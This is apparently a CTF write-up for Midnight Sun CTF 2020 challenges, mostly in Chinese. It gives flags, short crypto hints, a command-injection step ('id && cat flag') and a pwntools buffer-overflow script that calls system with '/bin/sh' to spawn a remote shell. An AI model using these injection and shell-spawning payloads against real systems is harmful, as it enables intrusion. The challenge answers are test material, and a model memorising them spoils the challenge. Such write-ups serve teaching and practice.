# Writeup

## Sanity/misc

签到题

> midnight{n0_c0ugh1ng_0n_1rc}

## admpanel/pwd

> 知识点：逆向、Linux &&拼接命令

> 题解

1. IDA pro逆向，拿到密码password
2. id && cat flag

> midnight{n3v3r_4sk_b0bb_to_d0_S0m3TH4Ng}

## admpanel2/pwd

```python
from pwn import *

s = remote("admpanel2-01.play.midnightsunctf.se", 31337)

system = 0x000000000401598
username_addr = 0x000000000040159B

s.sendline(b"1")
s.sendline(b"admin")
s.sendline(b"password")
s.sendline(b"1")
s.sendline(b"/bin/sh" + b" " * 1024 )
s.sendline(b"2")
s.sendline(b"A" * cyclic_find(b"raac") + p64(system) + p64(username_addr))
s.interactive()
# midnight{n3ver_4sk_hsp3_t0_do_s0m3th1ng}
```

## Verifier/Crypto

> 知识点：签名

> 题解

1. 对``please_give_me_the_flag``签名
2. 拿到签名，获取flag

> midnight{number_used_once_or_twice_or_more}

## Pybonhash/Crypto re

1. 爆破key
2. AES解密，验证是否hash值(0123456789abcdef)

https://github.com/zeze-zeze/CTF/blob/master/Games/midnightsun2020/pybonhash/sol.py

> midnight{xwJjPw4Vp0Zl19xIdaNuz6zTeMQ1wlNP}

## rsa_yay/Crypto

https://mcfx.us/archives/281/#h2-rsa_yay

## Masterpiece/forensics

1. https://www.youtube.com/watch?v=mRb8Kz3wwFs

## Indian guessing/guessing

输入数据、如果能被系统二分法很近，则输了，所以输入``nan``

> midnight{rice_and_cu^H^Hsoju}

## WP

- [wp](https://ctftime.org/event/935/tasks/)
